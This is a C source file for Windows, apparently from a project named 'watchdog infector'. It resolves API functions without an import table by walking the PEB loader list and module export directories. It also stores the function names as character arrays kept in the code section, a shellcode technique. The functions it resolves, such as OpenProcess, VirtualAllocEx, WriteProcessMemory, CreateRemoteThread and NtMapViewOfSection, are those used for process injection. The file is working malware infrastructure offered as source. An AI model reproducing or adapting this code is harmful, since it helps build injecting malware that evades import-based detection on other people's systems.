#include <Windows.h>
#include <winternl.h>

#include "x86-watchdog-infector.h"

/*
 This function does not handle forwarding.
 Some times export entries point to other export entries in the same or
 other modules. This function will crash if you try to look up a name that is
 forwarded.

 To keep the benefits of not having an import table in the compiled
 executable and still have the ability to resolve exported names that are
 forwarded, first look up the kernel32!GetProcAddress function, and then use
 it.
*/
PVOID
get_export_address(PBYTE module, PSTR name)
{
  PIMAGE_DOS_HEADER p_dos = (PIMAGE_DOS_HEADER)module;
  PIMAGE_NT_HEADERS p_nt = (PIMAGE_NT_HEADERS)(module + p_dos->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY p_export = (PIMAGE_EXPORT_DIRECTORY)(
    module + p_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
               .VirtualAddress);

  PDWORD AddressOfNames = (PDWORD)(module + p_export->AddressOfNames);
  PDWORD AddressOfFunctions = (PDWORD)(module + p_export->AddressOfFunctions);
  PWORD AddressOfNameOrdinals =
    (PWORD)(module + p_export->AddressOfNameOrdinals);

  for (DWORD n = 0; n < p_export->NumberOfNames; ++n) {
    CHAR* export_name = module + AddressOfNames[n];
    if (libc_strcmp(export_name, name) == 0) {
      return (PVOID)(module + AddressOfFunctions[AddressOfNameOrdinals[n]]);
    }
  }

  return NULL;
}

PVOID
get_module_base(PWSTR name)
{
  PPEB peb;
  DLL_PLDR_DATA_TABLE_ENTRY first_ldr_entry;
  DLL_PLDR_DATA_TABLE_ENTRY ldr_entry;

#ifdef _WIN64
  /*
    The quad word in slot 0x60 is the current process PEB structure
    address.
  */
  peb = (PPEB)__readgsqword(0x60);
#else
  /*
    The double word in slot 0x30 is the current process PEB structure
    address.
  */
  peb = (PPEB)__readfsdword(0x30);
#endif

  /*
    The PEB_LDR_DATA structure is incomplete, Reserved2[1] equals to
    InLoadOrderModuleList->Flink

    see: http://bytepointer.com/resources/tebpeb32.htm
  */
  first_ldr_entry = (DLL_PLDR_DATA_TABLE_ENTRY)peb->Ldr->Reserved2[1];

  ldr_entry = first_ldr_entry;
  do {
    if (libc_wstricmp(name, ldr_entry->BaseDllName.Buffer) == 0) {
      return ldr_entry->DllBase;
    }
    ldr_entry = (DLL_PLDR_DATA_TABLE_ENTRY)ldr_entry->InLoadOrderLinks.Flink;
  } while (ldr_entry != first_ldr_entry);

  return NULL;
}

int
resolve_dll_imports(struct dll_imports* imports)
{
  /*
    HACK:
    We use unsigned char arrays to force the compiler to include
    the data in the code section (.text) and not .data or .rdata.
  */
  wchar_t data_ntdll_dll[] = { L'n', L't', L'd', L'l', L'l',
                               L'.', L'd', L'l', L'l', 0 };
  wchar_t data_kernel32_dll[] = { L'k', L'e', L'r', L'n', L'e', L'l', L'3',
                                  L'2', L'.', L'd', L'l', L'l', 0 };
  char data_CreateProcessW[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r',
                                 'o', 'c', 'e', 's', 's', 'W', 0 };
  imports->CreateProcessW = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_CreateProcessW);
  if (imports->CreateProcessW == NULL) {
    return -1;
  }
  char data_VirtualAllocEx[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A',
                                 'l', 'l', 'o', 'c', 'E', 'x', 0 };
  imports->VirtualAllocEx = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_VirtualAllocEx);
  if (imports->VirtualAllocEx == NULL) {
    return -2;
  }
  char data_WriteProcessMemory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r',
                                     'o', 'c', 'e', 's', 's', 'M', 'e',
                                     'm', 'o', 'r', 'y', 0 };
  imports->WriteProcessMemory = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_WriteProcessMemory);
  if (imports->WriteProcessMemory == NULL) {
    return -3;
  }
  char data_CloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H',
                              'a', 'n', 'd', 'l', 'e', 0 };
  imports->CloseHandle = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_CloseHandle);
  if (imports->CloseHandle == NULL) {
    return -4;
  }
  char data_Sleep[] = { 'S', 'l', 'e', 'e', 'p', 0 };
  imports->Sleep = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_Sleep);
  if (imports->Sleep == NULL) {
    return -5;
  }
  char data_VirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a',
                              'l', 'F', 'r', 'e', 'e', 0 };
  imports->VirtualFree = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_VirtualFree);
  if (imports->VirtualFree == NULL) {
    return -6;
  }
  char data_VirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l',
                               'A', 'l', 'l', 'o', 'c', 0 };
  imports->VirtualAlloc = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_VirtualAlloc);
  if (imports->VirtualAlloc == NULL) {
    return -7;
  }
  char data_VirtualFreeEx[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l',
                                'F', 'r', 'e', 'e', 'E', 'x', 0 };
  imports->VirtualFreeEx = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_VirtualFreeEx);
  if (imports->VirtualFreeEx == NULL) {
    return -8;
  }
  char data_CreateRemoteThread[] = { 'C', 'r', 'e', 'a', 't', 'e', 'R',
                                     'e', 'm', 'o', 't', 'e', 'T', 'h',
                                     'r', 'e', 'a', 'd', 0 };
  imports->CreateRemoteThread = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_CreateRemoteThread);
  if (imports->CreateRemoteThread == NULL) {
    return -9;
  }
  char data_OpenProcess[] = { 'O', 'p', 'e', 'n', 'P', 'r',
                              'o', 'c', 'e', 's', 's', 0 };
  imports->OpenProcess = (PVOID)get_export_address(
    get_module_base((PWSTR)data_kernel32_dll), (PSTR)data_OpenProcess);
  if (imports->OpenProcess == NULL) {
    return -10;
  }
  char data_NtCreateSection[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e',
                                  'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
  imports->NtCreateSection = (PVOID)get_export_address(
    get_module_base((PWSTR)data_ntdll_dll), (PSTR)data_NtCreateSection);
  if (imports->NtCreateSection == NULL) {
    return -11;
  }
  char data_NtMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i',
                                     'e', 'w', 'O', 'f', 'S', 'e', 'c',
                                     't', 'i', 'o', 'n', 0 };
  imports->NtMapViewOfSection = (PVOID)get_export_address(
    get_module_base((PWSTR)data_ntdll_dll), (PSTR)data_NtMapViewOfSection);
  if (imports->NtMapViewOfSection == NULL) {
    return -12;
  }
  char data_NtQuerySystemInformation[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y',
                                           'S', 'y', 's', 't', 'e', 'm', 'I',
                                           'n', 'f', 'o', 'r', 'm', 'a', 't',
                                           'i', 'o', 'n', 0 };
  imports->NtQuerySystemInformation =
    (PVOID)get_export_address(get_module_base((PWSTR)data_ntdll_dll),
                              (PSTR)data_NtQuerySystemInformation);
  if (imports->NtQuerySystemInformation == NULL) {
    return -13;
  }
  char data_NtUnmapViewOfSection[] = { 'N', 't', 'U', 'n', 'm', 'a', 'p',
                                       'V', 'i', 'e', 'w', 'O', 'f', 'S',
                                       'e', 'c', 't', 'i', 'o', 'n', 0 };
  imports->NtUnmapViewOfSection = (PVOID)get_export_address(
    get_module_base((PWSTR)data_ntdll_dll), (PSTR)data_NtUnmapViewOfSection);
  if (imports->NtUnmapViewOfSection == NULL) {
    return -14;
  }
  return 0;
}
